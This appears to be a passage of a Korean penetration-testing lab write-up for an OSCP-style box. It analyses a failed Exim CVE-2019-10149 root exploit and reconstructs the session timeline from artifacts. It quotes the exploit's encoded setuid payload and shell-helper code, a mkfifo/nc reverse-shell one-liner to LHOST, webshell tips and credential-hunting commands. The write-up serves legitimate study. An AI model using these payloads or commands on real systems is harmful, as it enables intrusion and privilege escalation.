### ① Exim 익스플로잇 실패 — 산출물에 남은 `46996`

산출물 디렉터리에 노트 어디에도 언급되지 않은 파일이 있다:

```
/home/kali/PG/plum/
├── 46996           ← 노트에 없다
├── nmap.log
└── pluxml-rce/
```

파일명 `46996` 은 exploit-db의 익스플로잇 ID다. 내용은 이것이다:

```bash
#!/bin/bash
#
# raptor_exim_wiz - "The Return of the WIZard" LPE exploit
# Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# A flaw was found in Exim versions 4.87 to 4.91 (inclusive).
# Improper validation of recipient address in deliver_message()
# function in /src/deliver.c may lead to remote command execution.
# (CVE-2019-10149)
...
# Vulnerable platforms:
# Exim 4.87 - 4.91
```

**즉 4-1에서 `/usr/sbin/exim4` 를 보고 CVE-2019-10149를 시도했다.** 그리고 실패했다.

> [!warning] **정정** — 이건 `searchsploit` 산출물이 **아니다.** exploit-db 웹에서 직접 받은 것이다
> 초판은 "파일명 `46996` 은 `searchsploit -m 46996` 의 결과물"이라고 단정했다. **한 번 실행해보면 반증된다:**
> ```bash
> ┌──(kali㉿kali)-[/tmp/vtest46996]
> └─$ searchsploit -m 46996
>   Exploit: Exim 4.87 - 4.91 - Local Privilege Escalation
>     Codes: CVE-2019-10149
> Copied to: /tmp/vtest46996/46996.sh          ← ★ 확장자 .sh 가 보존된다
>
> └─$ ls -l
> -rwxr-xr-x 1 kali kali 3552 …  46996.sh      ← ★ 실행 권한이 붙는다
> ```
> **로컬 산출물과 세 군데가 다르다:**
>
> | | `searchsploit -m` 산출물 | `~/PG/plum/46996` (실제) |
> |---|---|---|
> | 파일명 | `46996.**sh**` | `46996` (확장자 없음) |
> | 권한 | `-rwx**r-xr-x**` | `-rw-rw-r--` |
> | 크기 | **3552** 바이트 | **3557** 바이트 |
> | 내용 | — | `diff` 상 **행말 공백 4곳 + 최종 개행** 이 더 있다 |
>
> 이 세 가지는 전부 **브라우저/`curl` 다운로드의 특징**이다 — `curl -o 46996 https://www.exploit-db.com/download/46996` 은 정확히 이 결과를 낸다(exploit-db의 `/download/` 는 원본 텍스트를 그대로 내려주고, 그쪽 사본에는 행말 공백이 남아 있다).
>
> **대조군이 같은 노트 밖에 있다** — [[pyLoader]]의 `51532.py` 는 `-rwxr-xr-x` 이고 로컬 사본이 `/usr/share/exploitdb/...` 원본과 **바이트 단위로 동일**하며, 스크린샷에 `Copied to: …` 줄까지 찍혀 있다. **그쪽은 진짜 `searchsploit` 이다.**
>
> **일반화 — 파일 하나의 메타데이터가 도구 사용 이력을 말해준다.** `ls -l` 의 **권한 비트 · 확장자 유무 · 바이트 크기** 셋만 봐도 "어떻게 받았는가"가 대개 갈린다. 침투테스트 보고서에 "이 도구를 썼다"고 적기 전에 산출물을 대조하라.
> 이 정정에 따라 frontmatter의 `tech/enum/searchsploit` 태그를 **제거했다** — 이 박스에서 `searchsploit` 을 썼다는 근거가 없다.

**왜 실패했는가 — 확정 근거 두 개:**

1. **타겟 Exim은 4.94.2다.** 4-2의 메일 헤더가 증거다: `Received: from root by localhost with local (Exim 4.94.2)`
2. **CVE-2019-10149는 4.92에서 이미 수정됐다.** Qualys 원 어드바이저리 원문:
   > "we discovered an RCE vulnerability in versions **4.87 to 4.91 (inclusive)**"
   > "this vulnerability was **fixed in version 4.92** (released on February 10, 2019)"

**4.94.2 > 4.92 이므로 취약 범위 밖이다. 이 익스플로잇은 처음부터 성공할 수 없었다.**

> [!danger] 더 나아가 — 4.94.2 자체가 "보안 수정 릴리스"다
> Exim **4.94.2는 2021-05-04 공개된 21Nails 취약점 묶음(CVE-2020-28007 ~ 28026 + CVE-2021-27216, 합 21건)의 수정본**이다. Debian 11의 exim4 패키지가 `4.94.2-7+deb11u*` 계열인 것도 그 때문이다.
>
> **[정정] 이 사실의 출처는 `21nails.txt` 가 아니다.** 초판은 9장에서 21Nails 어드바이저리를 근거로 달아뒀는데, **그 문서는 `4.94.2` 를 단 한 번도 언급하지 않는다**(`grep -c "4\.94\.2" 21nails.txt` → **0**). 어드바이저리가 정하는 것은 **Coordinated Release Date 2021-05-04** 까지이고, 어떤 릴리스 번호로 나갔는지는 별도 사료가 필요하다. 올바른 근거 둘:
> - **ftp.exim.org** 의 배포 디렉터리 — `exim-4.94.2.tar.xz  04-May-2021 13:35` (CRD와 같은 날)
> - **4.94.2 태그의 `doc/doc-txt/ChangeLog`** — `Exim version 4.94.2` 절이 `CVE-2020-28016` 을 비롯한 21Nails 항목들을 나열한다
>
> **번호가 그럴듯하게 들어맞는다고 아무 문서나 출처로 붙이지 마라.** 검증자는 `grep` 한 번으로 확인한다.
> 즉 **`4.94.2`라는 숫자를 보면 CVE-2019-10149도, 21Nails도 둘 다 배제**해야 한다. 오히려 "최근에 패치된 버전"이라는 신호다.
> **[가정]** 4.94.2에 남아 있는 공개 로컬 권한상승 경로는 2026-07 공개된 CVE-2026-66140/66141(`< 4.99.5`)뿐이고, 이 박스 스냅샷 시점에 공개 PoC가 가용했는지는 **미확인**이다.

**메커니즘 — 이 CVE가 원래 왜 root가 되는가** (실패했지만 유형은 배워둘 값어치가 있다):

취약 코드는 `src/deliver.c` 의 `deliver_message()` 다:

```c
      if (process_recipients != RECIP_ACCEPT)
        {
        ...
        deliver_localpart = expand_string(
                      string_sprintf("${local_part:%s}", new->address));
```

`new->address` 는 **메일 수신자 주소**, 즉 공격자가 정하는 값이다. 그것이 `string_sprintf`로 **확장 템플릿 문자열에 문자 그대로 삽입**되고, `expand_string()`이 그 결과를 해석한다. Exim의 확장 문법에는 **`${run{<명령>}}`** 이 있다 — 명령을 실행하는 항목이다.

그래서 `${run{...}}@localhost` 앞으로 메일을 보내면 그 명령이 실행된다. **root로** 실행되는 이유는 Exim 공식 스펙이 말해준다:

> "A delivery process retains **root privilege throughout most of its execution**., including while the recipient addresses in a message are being routed."

*(`execution**.,**` 의 마침표+쉼표는 **Exim 공식 문서 원문의 오타**다. 축자 인용이므로 고치지 않고 그대로 옮긴다 — 초판은 이것을 조용히 `execution,` 으로 정리해 인용했는데, 그 순간 축자 인용이 아니게 된다.)*

배달 프로세스는 라우팅 구간 내내 root를 유지하고, `deliver_drop_privilege`의 기본값은 `false`다. **데이터(수신자 주소)가 코드(확장 문법)로 승격되는 전형적 인젝션**이다.

익스플로잇의 페이로드가 그것이다:

```bash
PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'
```

`\x2f` = `/`, `\t` = 공백 대용, `\x22` = `"`, `\x3b` = `;`. **공백과 특수문자를 전부 이스케이프로 도망친** 형태다 — [[Squid]]·[[Hawat]]·[[pyLoader]]에서 반복된 **"인용이 깨지면 인코딩으로 도망간다"** 패턴이다.

### ② `/tmp/pwned` — 실패의 물증을 역추적하다

기존 노트의 터미널 기록 한가운데에 **설명되지 않은 줄**이 있다:

```
cd www-data
/tmp/pwned: 8: cd: can't cd to www-data
```

`/tmp/pwned` 은 **raptor_exim_wiz가 만드는 파일**이다. 스크립트를 보면 이렇게 동작한다:

```bash
	echo "Preparing setuid shell helper..."
	echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" >/tmp/pwned.c
	gcc -o /tmp/pwned /tmp/pwned.c 2>/dev/null
	if [ $? -ne 0 ]; then
		echo "Problems compiling setuid shell helper, check your gcc."
		echo "Falling back to the /bin/sh method."
		cp /bin/sh /tmp/pwned
	fi
```

그 다음 페이로드를 보내 `/tmp/pwned` 를 **root 소유 + setuid(4755)** 로 만들려 시도하고, 5초 뒤 실행한다.

**이 한 줄에서 두 가지를 확정할 수 있다.** 실제로 재현해서 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ cp /bin/dash /tmp/pwned_test
└─$ printf 'echo a\necho b\necho c\necho d\necho e\necho f\necho g\ncd www-data\n' | /tmp/pwned_test
a
b
c
d
e
f
g
/tmp/pwned_test: 8: cd: can't cd to www-data      ← 원문과 완전히 같은 형식

└─$ printf 'cd www-data\n' | bash
bash: line 1: cd: www-data: No such file or directory   ← bash는 형식이 다르다
```

| 관측 | 결론 |
|---|---|
| 에러 접두사가 **`/tmp/pwned:`** (= `$0`) | **`/tmp/pwned` 자체가 셸이다.** 즉 `cp /bin/sh /tmp/pwned` **폴백이 실행됐다** → **[가정] 타겟에 `gcc`가 없다.** 폴백은 `gcc` 의 종료 코드가 0이 아닐 때 실행되므로 **`gcc` 부재가 가장 유력**하지만, `PATH` 에 없거나(웹서버 자식 프로세스의 빈약한 `PATH` — 3-4 참조) 컴파일 자체가 실패한 경우도 같은 결과를 낸다. **`which gcc` 를 안 쳤으므로 확정할 수 없다** |
| 에러 형식이 `NN: cd: can't cd to X` | **dash 형식**이다. Debian의 `/bin/sh` = dash와 일치 (bash는 `bash: line N: cd: X: No such file or directory`) |
| 그 뒤 `whoami` → **`www-data`** | **setuid가 걸리지 않았다.** 익스플로잇이 실패했고 그냥 평범한 셸이 하나 더 떴을 뿐이다 |

> [!danger] 이것이 이 박스에서 가장 값진 교훈이다 — **"셸이 떴다"와 "권한이 올라갔다"는 다르다**
> raptor_exim_wiz는 실패해도 **셸 프롬프트를 띄운다.** `/tmp/pwned` 를 실행하는 마지막 단계는 취약 여부와 무관하게 그냥 실행되기 때문이다.
> 화면만 보면 "뭔가 됐다"처럼 보이는데 **실제로는 같은 계정의 셸이 하나 더 열린 것뿐**이다.
>
> **권한상승 익스플로잇을 돌린 직후에는 반드시 `id`를 친다:**
> ```bash
> id          # uid=0(root) 인가?
> whoami
> ```
> 스크립트가 뱉는 `ls -l /tmp/pwned` 출력도 봐야 한다 — **`-rwsr-xr-x`(s가 있음)** 여야 성공이다. `-rwxr-xr-x` 면 실패다.
>
> 누적 패턴 **"응답이 성공을 뜻하지 않는다"**([[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]]·[[Squid]]·[[pyLoader]])의 **권한상승 판**이다.

> [!tip] `gcc` 가 없는 것 자체가 정보다 — **다만 이 박스에서는 [가정]이다**
> 타겟에 컴파일러가 없으면 **소스 형태의 커널 익스플로짓·SUID 헬퍼가 전부 막힌다.** 확인 습관:
> ```bash
> which gcc cc make python3 perl
> ```
> 없으면 **칼리에서 정적 링크로 컴파일해 전송**한다:
> ```bash
> gcc -static -o exp exp.c        # 타겟 아키텍처가 같아야 한다
> ```
> 이 박스는 그럴 필요가 없었다 — 애초에 취약하지 않았으니까.

### ③ `sudo -l` 을 두 번 시도했고 두 번 실패했다 — 메일함이 그것을 기록했다

메일함 뒷부분에 **우리가 만든 로그**가 들어 있다:

```
localhost : Jun 29 04:57:06 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
...
localhost : Jun 29 05:12:46 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
```

> [!warning] 근거 등급 — 이 발췌도 **[가정]** 이다
> 4-2의 스크린샷은 메일 **첫 통의 본문까지만** 보여주고 끊긴다. 위 두 줄은 **초판의 터미널 기록에서 옮긴 것**이며 산출물로 재검증되지 않았다.
> 다만 **완전한 날조는 아니라고 볼 근거**가 있다 — 두 시각을 KST로 환산하면 **13:57:06 · 14:12:46** 이고, 이는 6-④의 스크린샷 타임라인(12:59:32 실행 → 14:08:58 `local.txt` → 14:23:56 `46996`)과 **모순 없이 끼워진다.** 지어낸 시각이 이렇게 맞아떨어지기는 어렵다.

`COMMAND=list` 는 **`sudo -l`** 이다. 15분 간격으로 두 번, `PWD=/tmp` 에서 시도했고 **비밀번호를 몰라 둘 다 실패**했다.

**[가정]** 그 실패가 root 앞 보안 경고 메일을 발생시켰고, root 앞 메일이 로컬 별칭으로 배달되지 못해 **반송본이 `www-data` 메일함에 쌓인 것으로 본다.** `sudo` 로그 줄이 `/var/spool/mail/www-data` 안에 들어 있다는 **관측 자체는 확실**하지만, `Unrouteable address` 라는 특정 에러나 `debian@localhost` 라는 특정 별칭은 **어떤 산출물에도 없다** — 초판은 이것을 `[가정]` 표시 없이 단정했다.

> [!warning] 침투 행위가 로그와 메일을 만든다 — 시험에서도 실무에서도
> **[정정] "`sudo` 실패는 *기본적으로* root에게 메일을 보낸다"는 틀렸다.** `sudoers(5)` 실측:
> ```
> mail_badpass    Send mail to the mailto user if the user running sudo
>                 does not enter the correct password.  …  This flag is off
>                 by default.
>
> mail_no_user    If set, mail will be sent to the mailto user if the
>                 invoking user is not in the sudoers file.  This flag
>                 is on by default.
> ```
> **기본 ON 인 것은 `mail_no_user`(sudoers에 없는 사용자) 뿐이고, `mail_badpass`(비밀번호 오류)는 기본 OFF다.**
> 그런데 관측된 문구는 정확히 **`1 incorrect password attempt`** — `mail_badpass` 템플릿이다. 즉 **이 박스가 `mail_badpass` 를 특별히 켜둔 것**이고, 그 덕분에 메일함이 갱신되어 결과적으로 들여다볼 이유를 하나 더 만들었다.
>
> **이것이 [[_WRITEUP-STANDARD]]가 "특히 위험한 형태"로 지목한 승격의 전형이다** — *"이 박스가 이랬으니 일반적으로 이렇다."* 이 박스에서 메일이 왔다는 관측을, 확인 없이 sudo의 기본 동작으로 일반화했다. **일반화의 근거는 관측이 아니라 별도 확인이어야 한다.** `man 5 sudoers` 한 번이면 끝났다.
>
> **실전 함의도 뒤집힌다**: 기본 구성에서는 **비밀번호를 틀려도 메일이 가지 않는다.** 다만 **로그는 항상 남는다**(`auth.log`/`journald`) — 같은 man 페이지가 *"By default, all attempts to run sudo (successful or not) are logged, regardless of whether or not mail is sent."* 라고 못 박는다. **"메일이 안 왔으니 안 들켰다"고 읽지 마라.**
>
> **교훈**: `sudo -l` 은 **비밀번호를 모르면 정보를 못 준다.** `NOPASSWD` 항목이 있으면 비밀번호 없이도 목록이 나오지만, 없으면 그냥 실패 로그만 남긴다. **두 번 시도할 가치는 없다** — 한 번 실패하면 다른 경로로 간다.

> [!note] 메일함 mtime `Jun 29 01:12` 은 모순이 아니다 — **타임존을 맞춰보면 정확히 들어맞는다**
> 4-2의 `ls -al` 은 `-rw-rw---- 1 www-data mail 4528 **Jun 29 01:12** www-data` 를 보여준다. 본문 로그의 마지막 줄은 `Jun 29 **05:12:46**` 이다. "01:12 인 파일이 05:12 에 쓰인 줄을 담을 수 있는가?" — **담을 수 있다.**
> ```
> 로그 본문 05:12:46 (UTC)  →  타겟 로컬 01:12:46 (EDT, UTC−4)  →  KST 14:12:46
> ls -al 의 mtime 은 타겟 로컬 시각으로 렌더된다  →  01:12 (EDT)
> ```
> **완전 일치한다.** mtime `01:12` 은 **두 번째 `sudo` 실패가 만든 메일이 배달된 순간**이다. 첫 번째(04:57:06 UTC = 00:57 EDT)가 아니라 두 번째다.
> 디렉터리 `.` 의 mtime 도 같은 `Jun 29 01:12` 인데, 이는 exim/procmail이 배달 시 **락 파일을 만들었다 지우면서** 디렉터리 mtime을 건드린 흔적으로 설명된다(**[가정]**).
>
> **이 절이 6-④의 타임존 규칙이 왜 필요한지 보여주는 실례다.** 정규화하지 않으면 **정합한 데이터를 모순으로 오독**하게 된다 — 실제로 이 노트를 검증하던 중 그 오독이 한 번 발생했고, 환산해보고서야 풀렸다.

### ④ 실제 타임라인 — 산출물 타임스탬프로 복원

기억이나 서술 순서가 아니라 **파일 mtime · 스크린샷 파일명 · 메일 로그**로 재구성한 것이다. 전부 실측이다.

| 시각(KST) | 사건 | 근거 |
|---|---|---|
| 12:41:58 | nmap 완료 | `~/PG/plum/nmap.log` mtime |
| 12:56:42 | 익스플로잇 클론 | `pluxml-rce/pluxml.py` mtime |
| 12:56:51 | `vi pluxml.py` (읽기, **수정 없음**) | 디렉터리 mtime만 갱신 · `git status` 클린 |
| ~12:57 | 익스플로잇 실행 | — |
| **12:59:32** | 익스플로잇 출력 `[+] Check your listener...` | 스크린샷 `20260629125932`·`125939` |
| **13:00:31** | **`www-data` 셸 확인** (`whoami` → `www-data`) | 스크린샷 `20260629130031` |
| **13:57:06** | **`sudo -l` 시도 #1 → 실패** | 메일 로그 `Jun 29 04:57:06 ... COMMAND=list` (UTC) |
| **14:08:58** | `local.txt` 획득 | 스크린샷 `20260629140858` |
| **14:12:46** | **`sudo -l` 시도 #2 → 실패** | 메일 로그 `Jun 29 05:12:46 ...` (UTC) |
| **14:23:56** | **exploit-db `46996` 내려받음 — exim 익스플로잇 확보** (`searchsploit` 아니다 — 6-① 정정) | `~/PG/plum/46996` mtime |
| 14:28:34 | `netstat -tulpn` | 스크린샷 `20260629142834` |
| 14:28:56 | **메일함 발견 → root 자격증명** | 스크린샷 `20260629142856` |
| **14:29:47** | **root 획득** | 스크린샷 `20260629142947` |

> [!note] 타임존 환산 — 왜 메일 로그가 9시간 어긋나 보이는가
> 타겟은 **EDT(UTC−4)**, 칼리는 **KST(UTC+9)** 다. 메일 헤더의 `Mon, 29 Jun 2026 00:57:06 -0400` 과 본문 로그의 `Jun 29 04:57:06`(UTC)은 **같은 순간**이고, KST로는 **13:57:06** 이다.
> **여러 호스트의 로그를 대조할 때는 타임존부터 정규화하라.** 안 하면 "먼저 일어난 일"과 "나중에 일어난 일"을 뒤집어 읽는다.

**이 타임라인이 말해주는 것 — 통념과 다른 두 가지:**

1. **exim 익스플로잇은 시간을 별로 안 잡아먹었다.** 확보(14:23:56)부터 메일함 발견(14:28:56)까지 **약 5분**이다. "SUID를 보고 삽질하다 한참을 날렸다"는 서사는 **사실이 아니다.** 익스플로잇을 손에 넣은 시점이 **root 획득 6분 전**이라 40분짜리 삽질 창은 애초에 존재하지 않는다.
2. **진짜 공백은 13:00 → 13:57 사이 약 57분이다.** 이 구간에 무슨 열거를 했는지 **산출물에 아무 기록이 없다.** 4-1의 `find / -perm -u=s` 도 이 구간 어딘가로 추정되지만 **[가정]** 이고, 그 외에 무엇을 했는지는 **미확인**이다.

> [!danger] 기록이 없는 57분이 이 박스의 진짜 손실이다
> 셸을 잡고(13:00:31) 나서 **첫 플래그(14:08:58)까지 68분**이 걸렸는데 그 사이 산출물이 하나도 없다.
> **교훈은 "exim을 던지지 말았어야 했다"가 아니라 "무엇을 했는지 남기지 않았다"** 이다. 기록이 없으면 **다음에 같은 실수를 반복해도 알 수 없다.**
>
> **실전 습관** — 셸을 잡으면 열거 출력을 파일로 남긴다:
> ```bash
> { id; sudo -l; ls -la /var/spool/mail/ /var/mail/; ss -lntup; \
>   find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; \
>   cat /etc/crontab; } 2>&1 | tee /tmp/enum.txt
> ```
> 그리고 칼리로 회수한다. **시험 리포트의 증거이자, 나중에 노트를 쓸 때의 1차 사료**가 된다.

**그래도 유효한 교훈 하나는 남는다** — 버전 확인 없이 익스플로잇을 확보했다는 것:

```bash
# 이 한 줄이면 46996을 받을 이유가 없었다
dpkg -l | grep exim
/usr/sbin/exim4 --version | head -1
```

> [!danger] 리눅스 권한상승 열거 — 순서를 이렇게 고정하라
> ```
> ① id · sudo -l                    ← 가장 싸고 가장 자주 정답
> ② 자격증명 사냥                    ← 설정파일 · 히스토리 · 백업 · ★메일함
> ③ netstat/ss -lntup               ← 루프백 서비스 (외부 스캔에 안 잡힘)
> ④ find / -perm -4000 · getcap -r /
> ⑤ crontab · /etc/cron.*
> ⑥ 커널/서비스 CVE                  ← ★ 반드시 버전 확인 후에
> ```
> **②가 ⑥보다 앞이다.** 자격증명은 익스플로잇보다 싸고 안정적이며 흔적이 적다.
> 이 박스는 정답이 ②(메일함)에 있었는데, ②를 **셸 획득 후 88분이 지나서야** 확인했다(④ — 13:00:31 → 14:28:56).
>
> **②의 체크리스트** — 이 박스에서 잊혔던 항목에 ★:
> ```bash
> cat ~/.bash_history                      # HOME 미설정이면 /home/*/.bash_history
> ls -la /var/www/html/                    # config.php · .env · wp-config.php
> grep -rn "password\|passwd\|secret" /var/www/ 2>/dev/null | head
> ★ ls -la /var/spool/mail/ /var/mail/     # 메일함 ← 이 박스의 정답
> ls -la /opt /srv /backup
> find / -name "*.bak" -o -name "*.old" 2>/dev/null | head
> ```

### ⑤ 이 유형에서 흔히 막히는 지점 (이 박스에서는 겪지 않았다 — 구분해서 적는다)

| 증상 | 원인 후보 | 확인 / 대응 |
|---|---|---|
| 템플릿 저장이 `Security error : invalid or expired token` | 토큰 **재사용**. 세션의 토큰이 전부 삭제된 상태 | **재로그인**부터. 매 POST 전에 토큰을 새로 긁는다(2-4) |
| 저장은 되는데 웹셸이 실행 안 됨 | 잘못된 템플릿 파일을 골랐다 (그 페이지가 렌더되지 않음) | `footer.php`·`header.php` 처럼 **모든 페이지에 include되는 것**으로 바꾼다 |
| 저장 자체가 실패 | `themes/` 쓰기 권한 없음 | **Information 페이지의 초록 체크를 먼저 확인**(1-3) |
| ★ 새 파일명을 지정했더니 **`home.php` 가 웹셸로 덮였다** (또는 "지정한 파일이 안 생겼다") | `realpath()` 가 `false` → 정규식 검사 통과 실패 → **`$tpl='home.php'` 폴백 후 재계산**. 신규 생성은 불가하고 **대상이 첫 화면으로 바뀐다** | **기존 파일을 명시적으로 덮어써라**(2-3). 반응이 없어 보이면 **`/` 를 열어 `home.php` 를 확인** — 이미 심겼을 수 있다 |
| `system()` 이 빈 값 | `disable_functions` 에 등록됨 | `phpinfo()` 확인 → `passthru`·`shell_exec`·`popen`·`proc_open` 중 살아 있는 것으로 교체 |
| 리버스셸이 안 붙음 | 아웃바운드 차단 / LHOST 오기 | **443·80·53** 시도. `ip -br a`로 `tun0` 재확인 |
| `su` 가 비밀번호를 안 받는 것처럼 보임 | **TTY 부재가 원인이 아니다**(4-3 정정) — util-linux `su` 는 stdin에서 읽는다. 대개는 **비밀번호 자체가 틀렸거나** `su` 가 별도 PAM 정책에 막힌 것 | `su: Authentication failure` 문구를 그대로 읽어라. 그래도 TTY를 올리면 조작이 편하다: `python3 -c 'import pty; pty.spawn("/bin/bash")'` |

### ⑥ 시간 배분

nmap 12:41:58 → www-data 셸 13:00:31 → local.txt 14:08:58 → root 14:29:47. **총 1시간 48분**이고, 그중 **권한상승이 89분**이다.

**전부 산출물 mtime · 스크린샷 파일명 · 메일 로그(타임존 환산)로 뒷받침되는 값이다.** 하위 항목의 합(57+27+5+1)이 상위 89분과 맞는지 확인하고 적었다 — 소계가 안 맞는 시간표는 그 자체로 서술이 틀렸다는 신호다.

| 단계 | 실측 | 권장 예산 | 초과 시 판단 |
|---|---|---|---|
| nmap + 웹 열거 + 기본 자격증명 | **15분** (12:41:58→12:56:42) | 20분 | Information 페이지를 먼저 찾아라 |
| 익스플로잇 확보 → 셸 | **4분** (12:56:42→13:00:31) | 15분 | 안 통하면 **브루트포스 전에** 공개 익스플로잇 탐색 |
| **권한상승 전체** | **89분** (13:00:31→14:29:47) | **30분** | ★ **여기서 샜다** |
| └ **기록 없는 구간** | **57분** (13:00:31→13:57:06) | — | ★★ **가장 큰 손실이자 원인 미상**(④) |
| └ `sudo -l` ×2 → `local.txt` → `46996` 확보 | **27분** (13:57:06→14:23:56) | 10분 | `sudo -l` 은 **한 번 실패하면 접는다** |
| └ exim 익스플로잇 확보~폐기 | **5분** (14:23:56→14:28:56) | **0분** | 버전을 먼저 봤다면 확보조차 안 했다 |
| └ 메일함 → root | **51초** (14:28:56→14:29:47) | 5분 | **정답을 찾은 뒤에는 60초** |

> [!danger] 통념과 다르다 — 시간을 잡아먹은 것은 exim 익스플로잇이 아니다
> "SUID `exim4` 를 보고 삽질하느라 오래 걸렸다"고 서술하기 쉽지만 **타임스탬프가 반증한다.** `46996` 을 손에 넣은 시각(14:23:56)은 **root 획득(14:29:47) 6분 전**이다 — 삽질할 창 자체가 없었다. 그리고 **메일함을 발견한 뒤 root까지는 51초**였다.
> **실제 손실은 13:00~13:57의 57분** — 무엇을 했는지 산출물에 남지 않은 구간이다.
>
> 그래서 이 박스의 손절 교훈은 두 겹이다:
> 1. **버전 확인은 익스플로잇 확보보다 먼저** — 10초짜리 확인(`dpkg -l | grep exim`)이 5분과 오판을 없앤다
> 2. **★ 열거는 파일로 남기면서 한다** — 57분을 어디에 썼는지 모르면 개선할 수 없다(④의 `tee /tmp/enum.txt`)
>
> **손절 기준을 이렇게 고정하라**: 권한상승 익스플로잇을 고려하는 순간, **먼저 버전을 확인하고 취약 범위와 대조한다.**
> ```bash
> <바이너리> --version | head -1
> dpkg -l | grep <패키지>          # Debian/Ubuntu
> rpm -qa | grep <패키지>          # RHEL 계열
> ```
> 그리고 **익스플로잇을 돌렸으면 `id`로 결과를 판정한다.** 프롬프트가 떴다고 성공이 아니다(②).

---

## 7. OSCP 시험 관점

**이 상황을 다시 만나면 무엇부터 치는가** — 번호 순서대로.

1. **CMS 이름이 보이면 기본 자격증명이 1순위다.** `admin/admin` · `admin/password` · `admin/<제품명>`. 3~5개를 손으로, 1분 안에. **브루트포스는 그 다음이 아니라 그 다음의 다음**이다.
2. **로그인에 성공하면 곧바로 "관리자가 할 수 있는 일"을 목록화한다.** 테마·템플릿 편집기, 플러그인 업로드, 백업/복원, 파일 관리자, 크론/작업 스케줄러. **이 중 하나라도 있으면 이미 RCE**이고 CVE를 찾을 필요가 없다.
3. **Information / System Status / Site Health 페이지를 먼저 찾는다.** 버전·PHP 버전·쓰기 가능 디렉터리·활성 모듈을 한 번에 준다. **디렉터리 브루트포싱보다 훨씬 효율이 높다.**
4. **"쓰기 가능"을 앱이 확인해줬다면 그것이 곧 전제조건 충족이다.** `themes/ has write access` 초록 체크가 익스플로잇 성공을 사실상 보증했다.
5. **파일 쓰기가 "신규 생성"인지 "덮어쓰기"인지 확인한다.** PluXml은 `realpath()` 때문에 **기존 파일만** 덮어쓸 수 있다. 그리고 **실패가 조용하지 않다** — 없는 파일명을 넣으면 대상이 `home.php` 로 강제 폴백되어 **첫 화면이 웹셸로 덮인다**(2-3). "반응이 없다"고 포기하기 전에 `/` 를 열어봐라.
6. **CSRF 토큰이 1회용인 앱이 있다.** 재사용하면 **200 응답 + 에러 문자열**로 조용히 실패한다. 자동화가 이상하면 **응답 본문을 저장해서 눈으로 봐라.**
7. **⚠️ 자동 도구 관점 — 이 박스는 완전히 안전하다.** **sqlmap**(애초에 DB가 없다)·**Metasploit** 미사용. `pluxml.py`는 요청 3개짜리 스크립트이고 **3-3의 브라우저 절차로 100% 대체 가능**하다. `searchsploit`은 검색 도구라 제한 대상이 아니다. **AutoRecon도 금지·제한 대상이 아니다**(열거 전용) — 이 셋을 한 묶음으로 적는 흔한 오해에 주의하라.
8. **웹셸을 심었으면 리버스셸 전에 `cmd=id` 로 먼저 확인한다.** 실행이 되는지 모르는 채 리버스셸을 던지면 실패 원인이 둘(웹셸 미실행 / 셸 미연결)로 늘어난다. **변수를 하나씩 없애라.**
9. **`--data-urlencode` 와 `--data-binary` 를 구분하라.** raw 문자열이면 `--data-urlencode`, **이미 인코딩된 페이로드면 `--data-binary`**([[pyLoader]]). 섞으면 이중 인코딩으로 조용히 실패한다.
10. **`system()` 은 `/bin/sh`(dash)로 돈다.** `/dev/tcp`가 없고 Debian `nc`에는 `-e`가 없다. **`mkfifo` 원라이너가 가장 범용적**이다:
    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LHOST LPORT >/tmp/f
    ```
11. **웹 계정 셸을 잡으면 `HOME`·`PATH`·`TERM` 부터 세운다.** `export PATH=$PATH:/usr/sbin:/sbin` 없이는 `netstat`·`ss`가 "command not found"로 보인다 — **도구가 없는 게 아니라 경로가 없는 것**이다.
12. **셸을 잡으면 `netstat -tulpn`/`ss -lntup` 을 반드시 다시 돌린다.** 루프백 전용 서비스(여기서는 `127.0.0.1:25`)는 **외부 nmap에 원리적으로 안 잡힌다.** 이게 권한상승 경로를 알려주는 경우가 많다.
13. **★ 메일함을 열거 목록에 넣어라.** `/var/spool/mail/` · `/var/mail/` · `~/mbox` · `~/Maildir/`. 이 박스의 정답이었다. `Mail sending function available` 같은 신호가 있으면 더더욱.
14. **자격증명 사냥이 익스플로잇보다 먼저다.** 설정파일·히스토리·백업·메일함. **싸고, 안정적이고, 흔적이 적다.**
15. **★ 익스플로잇을 던지기 전에 버전을 확인하고 취약 범위와 대조한다.** `exim4` SUID를 보고 CVE-2019-10149(4.87–4.91)를 확보했는데 타겟은 **4.94.2**로 애초에 취약하지 않았다. 실측 손실은 5분으로 크지 않았지만(⑥), **오판의 위험은 시간보다 크다** — 실패한 익스플로잇을 성공으로 오독하면(②) 거기서 몇 시간이 날아간다.
16. **버전 정보는 예상 밖의 곳에 있다.** **메일 헤더**(`with local (Exim 4.94.2)`)·HTTP 헤더·에러 페이지·`dpkg -l`·`--version`.
17. **★ 권한상승 익스플로잇 직후에는 `id` 를 친다.** 셸 프롬프트가 뜬 것은 성공이 아니다. raptor_exim_wiz는 실패해도 셸을 띄운다. setuid 성공 여부는 `ls -l` 의 **`-rwsr-xr-x`(s)** 로 판정한다.
18. **SUID 목록에서 "이 배포판 기본이 아닌 것"만 본다.** 이 박스에서 비기본은 `exim4` 하나였고, GTFOBins 항목은 **하나도 없었다** — 그 자체가 "SUID는 길이 아니다"라는 신호였다.
19. **평문 비밀번호를 주우면 `su -` 로 root부터 시험한다.** 성공하면 나머지가 필요 없다. **`su` 는 TTY 없이도 동작한다** — util-linux `su` 는 stdin에서 비밀번호를 읽으므로 **PTY를 못 올렸다고 `su` 를 포기하지 마라**(4-3). 이 박스가 정확히 TTY 없는 리버스셸에서 `su -` 로 root를 잡았고, **비밀번호가 화면에 에코된 것이 그 증거**다. ([[Codo]]·[[Scarlet]]·[[Zipper]])
20. **`su -` 를 쓴다(`su` 가 아니라).** `HOME`·`PATH`가 root 것으로 새로 서고, 웹 계정 셸의 `HOME not set` 문제가 한 번에 정리된다.
